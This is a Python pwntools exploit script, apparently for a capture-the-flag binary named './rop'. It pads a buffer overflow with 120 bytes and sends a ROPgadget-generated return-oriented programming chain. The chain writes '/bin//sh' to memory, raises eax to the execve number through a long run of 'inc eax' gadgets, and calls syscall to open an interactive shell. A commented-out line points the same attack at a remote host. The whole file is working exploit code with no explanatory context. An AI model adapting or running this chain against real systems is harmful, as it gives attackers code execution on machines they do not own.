#!/usr/bin/env python3
# execve generated by ROPgadget

from pwn import * # make sure pwn is above struct to avoid problems
from struct import pack

# Set up pwntools for the correct architecture
exe = './rop'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'

io = process(exe)
# io = remote('host', port)

# Padding goes here
p = b''

p += pack('<Q', 0x0000000000410103) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x0000000000415724) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000047f501) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000410103) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444c80) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f501) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x0000000000410103) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000449945) # pop rdx ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444c80) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x00000000004944f3) # inc eax ; ret
p += pack('<Q', 0x000000000040126c) # syscall

offset = 120
p = b"A" * offset + p

io.sendline(p)
io.interactive()
